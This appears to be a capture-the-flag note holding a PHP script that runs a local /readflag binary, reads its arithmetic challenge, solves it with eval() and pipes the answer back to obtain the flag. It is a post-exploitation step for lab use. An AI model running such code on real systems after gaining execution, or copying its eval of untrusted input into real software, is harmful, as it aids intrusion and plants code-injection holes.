# readflag

## php

```php

error_reporting(E_ALL);
echo "1";
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "r")
);

$file=array();

$process = proc_open("/readflag 2>&1", $descriptorspec, $file);

var_dump($process);
var_dump($file);

function readln($file){
    $out = "";
    $a = fread($file, 1);
    echo "readln";
    $count=0;
    while ($a != "\n") {
        $out = $out.$a;
        $a = fread($file, 1);
        $count++;
        if($count>100){break;}
    }
    return $out;
}

$data=readln($file[1]);
$data=substr($data,0,strpos($data,"="));
var_dump($data);
$ans = "".eval("return ".$data.";")."\n";
echo "ans";
var_dump($ans);
fputs($file[0], $ans);
$data=readln($file[1]);
echo $data;
$data=readln($file[1]);
echo $data;
$data=readln($file[1]);
echo $data;
```

